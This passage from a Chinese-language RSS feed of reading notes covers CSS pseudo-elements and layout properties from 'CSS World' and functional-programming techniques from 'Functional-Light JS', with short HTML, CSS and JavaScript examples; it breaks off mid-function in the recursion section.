<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>span</span><span>></span></span>第一个<span><span><span>&lt;/</span>span</span><span>></span></span>字符看看会不会变红？<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>p:first-letter</span> <span>{</span>
  <span>color</span><span>:</span> red<span>;</span>
<span>}</span>
<span>p > span</span> <span>{</span>
  <span>color</span><span>:</span> blue <span>!important</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>::first-letter 实际应用举例</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span>¥399<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>.price:first-letter</span> <span>{</span>
  <span>margin-right</span><span>:</span> 5px<span>;</span>
  <span>font-size</span><span>:</span> xx-large<span>;</span>
  <span>vertical-align</span><span>:</span> -2px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_46-故事相对较少的-first-line-伪元素"> 46. 故事相对较少的:first-line 伪元素</h2>
<ul>
<li>
<p>:first-line 的生效前提与:first-letter 一样，但没有 “赠品字符” 之类的梗存在。</p>
</li>
<li>
<p>::first-line 实际应用举例。</p>
<blockquote>
<ol>
<li>希望网站小标签、线框按钮和实色按钮全部都可以使用 color 颜色控制。</li>
</ol>
</blockquote>
<div><pre><code><span><span><span>&lt;</span>a</span> <span>href</span> <span>class</span><span><span>=</span><span>"</span>btn-normal red<span>"</span></span> <span>role</span><span><span>=</span><span>"</span>button<span>"</span></span><span>></span></span>红色按钮<span><span><span>&lt;/</span>a</span><span>></span></span>
<span><span><span>&lt;</span>a</span> <span>href</span> <span>class</span><span><span>=</span><span>"</span>btn-normal blue<span>"</span></span> <span>role</span><span><span>=</span><span>"</span>button<span>"</span></span><span>></span></span>蓝色按钮<span><span><span>&lt;/</span>a</span><span>></span></span>
<span><span><span>&lt;</span>a</span> <span>href</span> <span>class</span><span><span>=</span><span>"</span>btn-normal green<span>"</span></span> <span>role</span><span><span>=</span><span>"</span>button<span>"</span></span><span>></span></span>绿色按钮<span><span><span>&lt;/</span>a</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<ol start="2">
<li>当我们使用如下 CSS 代码的时候，实色背景按钮就会遇到文字颜色和背景颜色一样的问题。</li>
</ol>
</blockquote>
<div><pre><code><span>.btn-normal</span> <span>{</span>
  <span>background-color</span><span>:</span> currentColor<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<ol start="3">
<li>我们可以这样处理。</li>
</ol>
</blockquote>
<div><pre><code><span>.btn-normal::first-line</span> <span>{</span>
  <span>color</span><span>:</span> #fff<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_47-visibility-与元素的显隐"> 47. visibility 与元素的显隐</h2>
<ul>
<li>
<p>visibility 的继承性：父元素设置 visibility: hidden，子元素也会看不见，究其原因是继承性，子元素继承了 visibility: hidden，但是，如果子元素设置了 visibility: visible，则子元素又会显示出来，这个和 display 隐藏有着质的区别（<a href="https://demo.cssworld.cn/10/2-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>CSS3 transition 支持的 CSS 属性中有 visibility，但是并没有 display。</p>
</li>
</ul>
<h2 id="_48-真正的不占据空间的-outline-及其应用"> 48. 真正的不占据空间的 outline 及其应用</h2>
<ul>
<li>
<p>案例一：头像剪裁的矩形镂空效果（<a href="https://demo.cssworld.cn/11/1-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>案例二：自动填满屏幕剩余空间的应用技巧。</p>
</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>footer<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>p</span><span>></span></span>Designed <span title="&amp;">&amp;amp;</span> Powered by zhangxinxu<span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>.footer</span> <span>{</span>
  <span>height</span><span>:</span> 50px<span>;</span>
<span>}</span>
<span>.footer > p</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>text-align</span><span>:</span> center<span>;</span>
  <span>padding</span><span>:</span> 15px 0<span>;</span>
  <span>background-color</span><span>:</span> #a0b3d6<span>;</span>
  <span>outline</span><span>:</span> 9999px solid #a0b3d6<span>;</span>
  <span>clip</span><span>:</span> <span>rect</span><span>(</span>0 9999px 9999px 0<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_49-改变水平流向的-direction"> 49. 改变水平流向的 direction</h2>
<ul>
<li>CSS direction 与文字溢出打点效果（<a href="http://demo.cssworld.cn/12/1-2.php" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>p</span> <span>class</span><span><span>=</span><span>"</span>ell<span>"</span></span> <span>dir</span><span><span>=</span><span>"</span>ltr<span>"</span></span><span>></span></span>开头是我，这是中间，然后就是结束<span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;</span>p</span> <span>class</span><span><span>=</span><span>"</span>ell<span>"</span></span> <span>dir</span><span><span>=</span><span>"</span>rtl<span>"</span></span><span>></span></span>开头是我，这是中间，然后就是结束<span><span><span>&lt;/</span>p</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><div><pre><code><span>.ell</span> <span>{</span>
  <span>width</span><span>:</span> 240px<span>;</span>
  <span>white-space</span><span>:</span> nowrap<span>;</span>
  <span>text-overflow</span><span>:</span> ellipsis<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_50-改变-css-世界纵横规则的-writing-mode"> 50. 改变 CSS 世界纵横规则的 writing-mode</h2>
<ul>
<li>
<p>水平方向也能 margin 合并（<a href="http://demo.cssworld.cn/12/2-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
<li>
<p>使用 text-indent 实现文字下沉效果（<a href="https://demo.cssworld.cn/12/2-5.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>漫画算法 - 小灰的算法之旅</title>
      <link>https://www.matrixtheone.ga/web/note/books/Cartoon-Algorithms-Vol1/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Cartoon-Algorithms-Vol1/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">漫画算法 - 小灰的算法之旅</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>深入理解 JavaScript</title>
      <link>https://www.matrixtheone.ga/web/note/books/Depth-JS/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Depth-JS/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">深入理解 JavaScript</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>JavaScript 轻量级函数式编程</title>
      <link>https://www.matrixtheone.ga/web/note/books/Functional-Light-JS/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Functional-Light-JS/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 轻量级函数式编程</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-管理函数的输入"> 1. 管理函数的输入</h2>
<ul>
<li>偏函数：偏函数严格来讲是一个减少函数参数个数的过程。</li>
</ul>
<div><pre><code><span>function</span> <span>partial</span><span>(</span><span>fn<span>,</span> <span>...</span>presetArgs</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span> <span>partiallyApplied</span><span>(</span><span><span>...</span>laterArgs</span><span>)</span> <span>{</span>
    <span>return</span> <span>fn</span><span>(</span><span>...</span>presetArgs<span>,</span> <span>...</span>laterArgs<span>)</span>
  <span>}</span>
<span>}</span>

<span>function</span> <span>add</span><span>(</span><span>x<span>,</span> y</span><span>)</span> <span>{</span>
  <span>return</span> x <span>+</span> y
<span>}</span>

<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>map</span><span>(</span><span>partial</span><span>(</span>add<span>,</span> <span>3</span><span>)</span><span>)</span> <span>// => [4, 5, 6, 7, 8]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>
<p>将实参顺序颠倒。</p>
<blockquote>
<p>只有在传两个实参（匹配到 x 和 y 形参）调用 f(..) 函数时，&quot;z:last&quot; 这个值才能被赋给函数的形参 z。在其他的例子里，不管左边有多少个实参，&quot;z:last&quot; 都被传给最右的实参。</p>
</blockquote>
<div><pre><code><span>function</span> <span>reverseArgs</span><span>(</span><span>fn</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span> <span>argsReversed</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>return</span> <span>fn</span><span>(</span><span>...</span>args<span>.</span><span>reverse</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
<span>}</span>

<span>function</span> <span>partialRight</span><span>(</span><span>fn<span>,</span> <span>...</span>presetArgs</span><span>)</span> <span>{</span>
  <span>return</span> <span>reverseArgs</span><span>(</span><span>partial</span><span>(</span><span>reverseArgs</span><span>(</span>fn<span>)</span><span>,</span> <span>...</span>presetArgs<span>.</span><span>reverse</span><span>(</span><span>)</span><span>)</span><span>)</span>
<span>}</span>

<span>function</span> <span>foo</span><span>(</span><span>x<span>,</span> y<span>,</span> z</span><span>)</span> <span>{</span>
  <span>var</span> rest <span>=</span> <span>[</span><span>]</span><span>.</span><span>slice</span><span>.</span><span>call</span><span>(</span>arguments<span>,</span> <span>3</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>x<span>,</span> y<span>,</span> z<span>,</span> rest<span>)</span>
<span>}</span>

<span>var</span> f <span>=</span> <span>partialRight</span><span>(</span>foo<span>,</span> <span>'z:last'</span><span>)</span>

<span>f</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span> <span>// => 1 2 'z:last' []</span>

<span>f</span><span>(</span><span>1</span><span>)</span> <span>// => 1 'z:last' undefined []</span>

<span>f</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)</span> <span>// => 1 2 3 ['z:last']</span>

<span>f</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>)</span> <span>// => 1 2 3 [4,'z:last']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div></li>
<li>
<p>柯里化：柯里化将一个多参数（higher-arity）函数拆解为一系列的单元链式函数。</p>
</li>
<li>
<p>柯里化和偏应用相似，每个类似偏应用的连续柯里化调用都把另一个实参应用到原函数，一直到所有实参传递完毕。不同之处在于，curriedAjax(..) 函数会明确地返回一个期望只接收下一个实参 data 的函数（我们把它叫做 curriedGetPerson(..)），而不是那个能接收所有剩余实参的函数（像此前的 getPerson(..) 函数）。</p>
<ul>
<li>严格柯里化（一次处理 {1, 1} 个参数）。</li>
</ul>
<div><pre><code><span>function</span> <span>curry</span><span>(</span><span>fn<span>,</span> arity <span>=</span> fn<span>.</span>length</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span>function</span> <span>nextCurried</span><span>(</span><span>prevArgs</span><span>)</span> <span>{</span>
    <span>return</span> <span>function</span> <span>curried</span><span>(</span><span>nextArg</span><span>)</span> <span>{</span>
      <span>var</span> args <span>=</span> prevArgs<span>.</span><span>concat</span><span>(</span><span>[</span>nextArg<span>]</span><span>)</span>

      <span>if</span> <span>(</span>args<span>.</span>length <span>>=</span> arity<span>)</span> <span>{</span>
        <span>return</span> <span>fn</span><span>(</span><span>...</span>args<span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>nextCurried</span><span>(</span>args<span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span><span>)</span><span>(</span><span>[</span><span>]</span><span>)</span>
<span>}</span>

<span>function</span> <span>add</span><span>(</span><span>x<span>,</span> y</span><span>)</span> <span>{</span>
  <span>return</span> x <span>+</span> y
<span>}</span>

<span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>.</span><span>map</span><span>(</span><span>curry</span><span>(</span>add<span>)</span><span>(</span><span>3</span><span>)</span><span>)</span> <span>// => [4, 5, 6, 7, 8]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><ul>
<li>松散柯里化（一次处理 {0, } 个参数）。</li>
</ul>
<div><pre><code><span>function</span> <span>looseCurry</span><span>(</span><span>fn<span>,</span> arity <span>=</span> fn<span>.</span>length</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span><span>function</span> <span>nextCurried</span><span>(</span><span>prevArgs</span><span>)</span> <span>{</span>
    <span>return</span> <span>function</span> <span>curried</span><span>(</span><span><span>...</span>nextArgs</span><span>)</span> <span>{</span>
      <span>var</span> args <span>=</span> prevArgs<span>.</span><span>concat</span><span>(</span>nextArgs<span>)</span>

      <span>if</span> <span>(</span>args<span>.</span>length <span>>=</span> arity<span>)</span> <span>{</span>
        <span>return</span> <span>fn</span><span>(</span><span>...</span>args<span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>nextCurried</span><span>(</span>args<span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span><span>)</span><span>(</span><span>[</span><span>]</span><span>)</span>
<span>}</span>

<span>function</span> <span>add</span><span>(</span><span>x<span>,</span> y<span>,</span> z</span><span>)</span> <span>{</span>
  <span>return</span> x <span>+</span> y <span>+</span> z
<span>}</span>

<span>looseCurry</span><span>(</span>add<span>)</span><span>(</span><span>2</span><span>)</span><span>(</span><span>3</span><span>,</span> <span>5</span><span>)</span> <span>// => 10</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>反柯里化：拿到一个柯里化后的函数，却想要它柯里化之前的版本 —— 这本质上就是想将类似 f(1)(2)(3) 的函数变回类似 g(1,2,3) 的函数。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>uncurrying</span><span>(</span><span>fn</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span> <span>uncurried</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
    <span>var</span> ret <span>=</span> fn

    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> args<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      ret <span>=</span> <span>ret</span><span>(</span>args<span>[</span>i<span>]</span><span>)</span>
    <span>}</span>

    <span>return</span> ret
  <span>}</span>
<span>}</span>

<span>function</span> <span>sum</span><span>(</span><span><span>...</span>args</span><span>)</span> <span>{</span>
  <span>var</span> sum <span>=</span> <span>0</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> args<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    sum <span>+=</span> args<span>[</span>i<span>]</span>
  <span>}</span>
  <span>return</span> sum
<span>}</span>

<span>var</span> curriedSum <span>=</span> <span>curry</span><span>(</span>sum<span>,</span> <span>5</span><span>)</span>
<span>var</span> uncurriedSum <span>=</span> <span>uncurry</span><span>(</span>curriedSum<span>)</span>

<span>curriedSum</span><span>(</span><span>1</span><span>)</span><span>(</span><span>2</span><span>)</span><span>(</span><span>3</span><span>)</span><span>(</span><span>4</span><span>)</span><span>(</span><span>5</span><span>)</span> <span>// => 15</span>

<span>uncurriedSum</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>)</span> <span>// => 15</span>
<span>uncurriedSum</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)</span><span>(</span><span>4</span><span>)</span><span>(</span><span>5</span><span>)</span> <span>// => 15</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><ul>
<li>只要一个实参：强制把一个函数处理成单参数函数（unary）。</li>
</ul>
<div><pre><code><span>function</span> <span>unary</span><span>(</span><span>fn</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span> <span>onlyOneArg</span><span>(</span><span>arg</span><span>)</span> <span>{</span>
    <span>return</span> <span>fn</span><span>(</span>arg<span>)</span>
  <span>}</span>
<span>}</span>

<span>[</span><span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>]</span><span>.</span><span>map</span><span>(</span>parseInt<span>)</span> <span>// => [10, NaN, 2, 3, 4]</span>
<span>[</span><span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>]</span><span>.</span><span>map</span><span>(</span><span>unary</span><span>(</span>parseInt<span>)</span><span>)</span> <span>// => [10, 10, 10, 10, 10]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_2-组合函数"> 2. 组合函数</h2>
<ul>
<li>
<p>函数组合是一种定义函数的模式，它能将一个函数调用的输出路由到另一个函数的调用上，然后一直进行下去。</p>
</li>
<li>
<p>因为 JS 函数只能返回单个值，这个模式本质上要求所有组合中的函数（可能第一个调用的函数除外）是一元的，当前函数从上一个函数输出中只接收一个输入。</p>
</li>
<li>
<p>相较于在我们的代码里详细列出每个调用，函数组合使用 compose(..) 实用函数来提取出实现细节，让代码变得更可读，让我们更关注组合完成的是什么，而不是它具体做什么。</p>
</li>
<li>
<p>组合 —— 声明式数据流 —— 是支撑函数式编程其他特性的最重要的工具之一。</p>
</li>
<li>
<p><strong>之前学习过组合函数，阅读本书组合函数时与现存理解相仿！</strong></p>
</li>
</ul>
<h2 id="_3-副作用"> 3. 副作用</h2>
<ul>
<li>当我们在阅读程序的时候，能够清晰明确的识别每一个起因和每一个结果是非常重要的。在某种程度上，通读程序但不能看到因果的直接关系，程序的可读性就会降低。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>x</span><span>)</span> <span>{</span>
  y <span>=</span> x <span>*</span> <span>2</span>
<span>}</span>

<span>var</span> y

<span>foo</span><span>(</span><span>3</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><ul>
<li>编程中的幂等：幂等的面向程序的定义也是类似的，但不太正式。编程中的幂等仅仅是 f(x); 的结果与 f(x); f(x) 相同而不是要求 f(x) === f(f(x))。换句话说，之后每一次调用 f(x) 的结果和第一次调用 f(x) 的结果没有任何改变。</li>
</ul>
<div><pre><code><span>// 幂等的：</span>
obj<span>.</span>count <span>=</span> <span>2</span>
a<span>[</span>a<span>.</span>length <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>42</span>
person<span>.</span>name <span>=</span> <span>upper</span><span>(</span>person<span>.</span>name<span>)</span>

<span>// 非幂等的：</span>
obj<span>.</span>count<span>++</span>
a<span>[</span>a<span>.</span>length<span>]</span> <span>=</span> <span>42</span>
person<span>.</span>lastUpdated <span>=</span> Date<span>.</span><span>now</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><ul>
<li>
<p>纯粹的快乐：没有副作用的函数称为纯函数。在编程的意义上，纯函数是一种幂等函数，因为它不可能有任何副作用。</p>
</li>
<li>
<p>表达一个函数的纯度的另一种常用方法是：给定相同的输入（一个或多个），它总是产生相同的输出。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>add</span><span>(</span><span>x<span>,</span> y</span><span>)</span> <span>{</span>
  <span>return</span> x <span>+</span> y
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>
<p>副作用对代码的可读性和质量都有害，因为它们使您的代码难以理解。副作用也是程序中最常见的错误原因之一，因为很难应对他们。幂等是通过本质上创建仅有一次的操作来限制副作用的一种策略。</p>
</li>
<li>
<p>避免副作用的最优方法是使用纯函数。纯函数给定相同输入时总返回相同输出，并且没有副作用。引用透明更近一步的状态是 —— 更多的是一种脑力运动而不是文字行为 —— 纯函数的调用是可以用它的输出来代替，并且程序的行为不会被改变。</p>
</li>
</ul>
<h2 id="_4-闭包-vs-对象"> 4. 闭包 VS 对象</h2>
<ul>
<li>
<p>德高望重的大师 Qc Na 曾经和他的学生 Anton 一起散步。Anton 希望引导大师到一个讨论里，说到：大师，我曾听说对象是一个非常好的东西，是这样么？Qc Na 同情地看着他的学生回答到, “愚笨的弟子，对象只不过是可怜人的闭包”</p>
</li>
<li>
<p>被批评后，Anton 离开他的导师并回到了自己的住处，致力于学习闭包。他认真的阅读整个“匿名函数：终极……”系列论文和它的姐妹篇，并且实践了一个基于闭包系统的小的 Scheme 解析器。他学了很多，盼望展现给他导师他的进步。</p>
</li>
<li>
<p>当他下一次与 Qc Na 一同散步时，Anton 试着提醒他的导师，说到 “导师，我已经勤奋地学习了这件事，我现在明白了对象真的是可怜人的闭包。” ，Qc Na 用棍子戳了戳 Anton 回应到，“你什么时候才能学会，闭包才是可怜人的对象”。在那一刻， Anton 明白了什么。</p>
</li>
</ul>
<h2 id="_5-列表操作"> 5. 列表操作</h2>
<ul>
<li>
<p>映射。</p>
<blockquote>
<p>mapperFn, arr 的参数顺序，乍一看像是在倒退。但是这种方式在函数式编程类库中非常常见。因为这样做，可以让这些实用函数更容易被组合。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>function</span> <span>map</span><span>(</span><span>mapperFn<span>,</span> arr</span><span>)</span> <span>{</span>
  <span>var</span> newList <span>=</span> <span>[</span><span>]</span>

  <span>for</span> <span>(</span><span>let</span> idx <span>=</span> <span>0</span><span>;</span> idx <span>&lt;</span> arr<span>.</span>length<span>;</span> idx<span>++</span><span>)</span> <span>{</span>
    newList<span>.</span><span>push</span><span>(</span><span>mapperFn</span><span>(</span>arr<span>[</span>idx<span>]</span><span>,</span> idx<span>,</span> arr<span>)</span><span>)</span>
  <span>}</span>

  <span>return</span> newList
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><ul>
<li>
<p>函子：函子是采用运算函数有效用操作的值。</p>
</li>
<li>
<p>如果问题中的值是复合的，意味着它是由单个值组成，就像数组中的情况一样。例如，函子在每个单独的值上执行操作函数。函子实用函数创建的新值是所有单个操作函数执行的结果的组合。</p>
<blockquote>
<p>字符串函子是一个字符串加上一个实用函数，这个实用函数在字符串的所有字符上执行某些函数操作，返回包含处理过的字符的字符串。</p>
</blockquote>
<div><pre><code><span>function</span> <span>uppercaseLetter</span><span>(</span><span>c</span><span>)</span> <span>{</span>
  <span>var</span> code <span>=</span> c<span>.</span><span>charCodeAt</span><span>(</span><span>0</span><span>)</span>

  <span>// 小写字母?</span>
  <span>if</span> <span>(</span>code <span>>=</span> <span>97</span> <span>&amp;&amp;</span> code <span>&lt;=</span> <span>122</span><span>)</span> <span>{</span>
    <span>// 转换为大写!</span>
    code <span>=</span> code <span>-</span> <span>32</span>
  <span>}</span>

  <span>return</span> String<span>.</span><span>fromCharCode</span><span>(</span>code<span>)</span>
<span>}</span>

<span>function</span> <span>stringMap</span><span>(</span><span>mapperFn<span>,</span> str</span><span>)</span> <span>{</span>
  <span>return</span> <span>[</span><span>...</span>str<span>]</span><span>.</span><span>map</span><span>(</span>mapperFn<span>)</span><span>.</span><span>join</span><span>(</span><span>''</span><span>)</span>
<span>}</span>

<span>stringMap</span><span>(</span>uppercaseLetter<span>,</span> <span>'Hello World!'</span><span>)</span> <span>// 'HELLO WORLD!'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<p>过滤器。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>filter</span><span>(</span><span>predicateFn<span>,</span> arr</span><span>)</span> <span>{</span>
  <span>var</span> newList <span>=</span> <span>[</span><span>]</span>

  <span>for</span> <span>(</span><span>let</span> idx <span>=</span> <span>0</span><span>;</span> idx <span>&lt;</span> arr<span>.</span>length<span>;</span> idx<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>predicateFn</span><span>(</span>arr<span>[</span>idx<span>]</span><span>,</span> idx<span>,</span> arr<span>)</span><span>)</span> <span>{</span>
      newList<span>.</span><span>push</span><span>(</span>arr<span>[</span>idx<span>]</span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> newList
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>Reduce。</li>
</ul>
<div><pre><code><span>function</span> <span>reduce</span><span>(</span><span>reducerFn<span>,</span> initialValue<span>,</span> arr</span><span>)</span> <span>{</span>
  <span>var</span> acc<span>,</span> startIdx

  <span>if</span> <span>(</span>arguments<span>.</span>length <span>==</span> <span>3</span><span>)</span> <span>{</span>
    acc <span>=</span> initialValue
    startIdx <span>=</span> <span>0</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>arr<span>.</span>length <span>></span> <span>0</span><span>)</span> <span>{</span>
    acc <span>=</span> arr<span>[</span><span>0</span><span>]</span>
    startIdx <span>=</span> <span>1</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>'Must provide at least one value.'</span><span>)</span>
  <span>}</span>

  <span>for</span> <span>(</span><span>let</span> idx <span>=</span> startIdx<span>;</span> idx <span>&lt;</span> arr<span>.</span>length<span>;</span> idx<span>++</span><span>)</span> <span>{</span>
    acc <span>=</span> <span>reducerFn</span><span>(</span>acc<span>,</span> arr<span>[</span>idx<span>]</span><span>,</span> idx<span>,</span> arr<span>)</span>
  <span>}</span>

  <span>return</span> acc
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h2 id="_6-递归"> 6. 递归</h2>
<ul>
<li>
<p>相互递归：如果在一个递归循环中，出现两个及以上的函数相互调用，则称之为相互递归。</p>
<blockquote>
<p>实现斐波纳契数列。</p>
</blockquote>
<div><pre><code><span>function</span> <span>fib_</span><span>(</span><span>n</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>n <span>==</span> <span>1</span><span>)</span> <span>return</span> <span>1</span>
  <span>else</span> <span>return</span> <span>fib</span><span>(</span>n <span>-</span> <span>2</span><span>)</span>
<span>}</span>

<span>function</span> <span>fib</span><span>(</span><span>n</span><span>)</span> <span>{</span>
